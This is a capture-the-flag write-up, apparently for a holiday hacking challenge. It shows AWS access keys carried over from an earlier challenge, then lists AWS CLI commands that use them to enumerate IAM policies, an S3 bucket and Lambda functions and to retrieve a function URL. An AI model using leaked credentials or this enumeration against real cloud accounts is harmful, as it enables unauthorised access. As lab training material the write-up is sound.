# Exploitation Via AWS CLI

<table class=MsoTableGrid border=1 cellspacing=0 cellpadding=0 width=786
 style='width:589.5pt; margin-xxxleft:-63.25pt;border-collapse:collapse;border:
 none'>
 <tr>
  <td width=786 colspan=2 valign=top style='width:589.5pt;border:solid windowtext 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MyNormalStyle><img border=0 width=19 height=20 id="Picture 56"
  src="../../images/blog_images/image188.png"><a
  name="_Hlk123467511">Exploitation via AWS
  CLI </a>
   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <img
  border=0 width=27 height=25 id="Picture 488"
  src="../../images/blog_images/image039.png">Cloud
  Ring 
   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <img border=0
  width=25 height=24 id="Picture 48"
  src="../../images/blog_images/image203.png"
  alt="A picture containing clipart&#10;&#10;Description automatically generated">Sulfrod</p>
  </td>
 </tr>
 <tr style='height:53.25pt'>
  <td width=84 rowspan=2 valign=top style='width:63.0pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:53.25pt'>
  <p class=MsoNormal style=' margin-xxxbottom:0in;line-height:normal'><img
  border=0 width=69 height=135 id="Picture 49"
  src="../../images/blog_images/image204.png"
  alt="A person in a garment&#10;&#10;Description automatically generated with low confidence"></p>
  </td>
  <td width=702 valign=top style='width:526.5pt;border-top:none;border-left:
  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;
  padding:0in 5.4pt 0in 5.4pt;height:53.25pt'>
  <p class=MsoNormal style=' margin-xxxbottom:0in;line-height:normal'>
  <img src="../../images/blog_images/image205.png"
  alt="Graphical user interface, text&#10;&#10;Description automatically generated"></p>
  </td>
 </tr>
 <tr style='height:35.25pt'>
  <td width=702 valign=top style='width:526.5pt;border-top:none;border-left:
  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;
  padding:0in 5.4pt 0in 5.4pt;height:35.25pt'>
  <p class=MyNormalStyle>Hints :<br>
  AWS <a
  href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-vs-inline.html">inline
  policies</a> pertain to one identity while managed policies can be attached
  to many identities.</p>
  </td>
 </tr>
 </table>



<table class=MsoTableGrid border=2 cellspacing=0 cellpadding=0 width=786
 style='width:589.5pt; margin-xxxleft:-63.25pt;border-collapse:collapse;border:
 none'>
 <tr style='height:35.25pt'>
  <td width=786 colspan=2 valign=top style='width:589.5pt;border:solid windowtext 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MyNormalStyle>We have AWS credentials from the previous challenge
  Trufflehog Search<br>
  aws_access_key_id=&quot;AKIAAIDAYRANYAHGQOHD&quot;,</p>
  <p class=MyNormalStyle>aws_secret_access_key=&quot;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&quot;</p>
  </td>
 </tr>
 <tr style='height:13.0pt'>
  <td width=786 colspan=2 valign=top style='width:589.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:13.0pt'>
  <p class=TableRowBold>Configure aws cli with the above credentials</p>
  </td>
 </tr>
 <tr style='height:13.0pt'>
  <td width=786 colspan=2 valign=top style='width:589.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:13.0pt'>
  ```python
  aws configure
  ```
  </td>
 </tr>
 <tr style='height:13.0pt'>
  <td width=786 colspan=2 valign=top style='width:589.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:13.0pt'>
  <p class=MsoNormal style=' margin-xxxbottom:0in;line-height:normal'><img
  border=0 width=786 height=235 id="Picture 51"
  src="../../images/blog_images/image206.png"
  alt="A screenshot of a computer&#10;&#10;Description automatically generated"></p>
  </td>
 </tr>
 <tr style='height:13.0pt'>
  <td width=786 colspan=2 valign=top style='width:589.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:13.0pt'>
  <p class=TableRowBold>Get the caller identity</p>
  ```python
  aws sts get-caller-identity
  ```
  </td>
 </tr>
 <tr style='height:13.0pt'>
  <td width=786 colspan=2 valign=top style='width:589.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:13.0pt'>
  <p class=MyCodeStyle><img border=0 width=431 height=98 id="Picture 52"
  src="../../images/blog_images/image207.png"
  alt="Text&#10;&#10;Description automatically generated"></p>
  </td>
 </tr>
 <tr style='height:13.0pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:13.0pt'>
  <p class=TableRowBold>"haug" is the user. Get the policy attached to this user.</p>
  </td>
 </tr>
 <tr style='height:13.0pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:13.0pt'>
  ```python
  aws iam list-attached-user-policies --user-name haug
  ```
  </td>
 </tr>
 <tr style='height:13.0pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:13.0pt'>
  <p class=MyCodeStyle><img src="../../images/blog_images/image208.png"
  alt="A screenshot of a computer&#10;&#10;Description automatically generated with medium confidence"></p>
  </td>
 </tr>
</table>

<table class=MsoTableGrid border=1 cellspacing=0 cellpadding=0 align=left
 width=800 style='width:600.3pt;margin-xxxleftxxx:6.75pt;  margin-xxxleftyyy:6.75pt'>
 <tr style='height:15.85pt'>
  <td width=786 valign=top style='width:589.25pt;border:solid windowtext 1.0pt;
  padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=TableRowBold>Get the details of the policy TIER1_READONLY_POLICY attached to the user.</p>
  </td>
  
 </tr>
 <tr style='height:15.85pt'>
  <td width=786 valign=top style='width:589.25pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  ```python
  aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY
  ```
  </td>
  
 </tr>
 <tr style='height:15.85pt'>
  <td width=786 valign=top style='width:589.25pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=MyCodeStyle><img src="../../images/blog_images/image209.png"
  alt="Text&#10;&#10;Description automatically generated"></p>
  </td>
  
 </tr>
 <tr style='height:15.85pt'>
  <td width=800  valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=TableRowBold>Get the default version of the policy  TIER1_READONLY_POLICY</p>
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800  valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  ```python
  aws iam get-policy-version --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY --version-id v1
  ```
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800  valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=MyCodeStyle><img src="../../images/blog_images/image210.png"
  alt="Text&#10;&#10;Description automatically generated"></p>
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800  valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=MyNormalStyle>Get the inline policy attached to the user</p>
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  ```python
  aws iam list-user-policies --user-name haug
  ```
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=MyCodeStyle><img src="../../images/blog_images/image211.png"
  alt="A screenshot of a computer&#10;&#10;Description automatically generated with medium confidence"></p>
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=MyNormalStyle>The policy attached to the user is S3Perms. Get
  details of this policy.</p>
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  ```python
  aws iam get-user-policy --user-name haug --policy-name S3Perms
  ```
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=MyCodeStyle><img src="../../images/blog_images/image212.png"
  alt="Text&#10;&#10;Description automatically generated"></p>
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=TableRowBold>The earlier command discolosed name of an s3 bucket
  named "smogmachines3". List its objects.</p>
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  ```python
  aws s3api list-objects --bucket smogmachines3
  ```
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=MyCodeStyle><img src="../../images/blog_images/image213.png"
  alt="Text&#10;&#10;Description automatically generated"></p>
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=TableRowBold>Tha attached user policy provided us lambda privileges. List all the lamda functions.</p>
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  ```python
  aws lambda list-functions
  ```
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=TableRowBold>Lambda functions can have public URLs from which they
  are directly accessible. Use AWS CLI to get the configuration containing the
  public URL.</p>
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=TableRowBold>First, we get the function details</p>
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  ```python
  aws lambda list-functions | head -10
  ```
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=MyCodeStyle><img border=0 width=770 height=180 id="Picture 63"
  src="../../images/blog_images/image214.png"
  alt="Text&#10;&#10;Description automatically generated"></p>
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=TableRowBold>Get the configuration containing the public URL of the
  lambda function "smogmachine_lambda"</p>
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  ```python
  aws lambda get-function-url-config --function-name  smogmachine_lambda
  ```
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=MyCodeStyle><img border=0 width=730 height=179 id="Picture 454"
  src="../../images/blog_images/image215.png"
  alt="Text&#10;&#10;Description automatically generated"></p>
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=TableRowBold><b>Lambda
  function URL : </b><a
  href="https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/"><b>https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/</b></a></p>
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=TableRowBold>We submit the answer and the objective is now completed. And we get 25 coins as
  well</p>
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=MyCodeStyle><img border=0 width=317 height=48 id="Picture 462"
  src="../../images/blog_images/image216.png"
  alt="A picture containing text&#10;&#10;Description automatically generated"><img
  border=0 width=282 height=48 id="Picture 473"
  src="../../images/blog_images/image217.png"></p>
  </td>
 </tr>
 <tr style='height:15.85pt'>
  <td width=800 colspan=2 valign=top style='width:600.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:15.85pt'>
  <p class=MyCodeStyle align=center style='text-align:center'><b><span
  style='font-size:11.0pt;font-family:"Calibri",sans-serif'>At this point we
  have </span></b><b><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>retrieved
  the cloud ring</span></b></p>
  <p class=MyCodeStyle align=center style='text-align:center'><b><span
  style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img border=0
  width=535 height=94 id="Picture 481"
  src="../../images/blog_images/image218.png"></span></b></p>
  </td>
 </tr>
</table>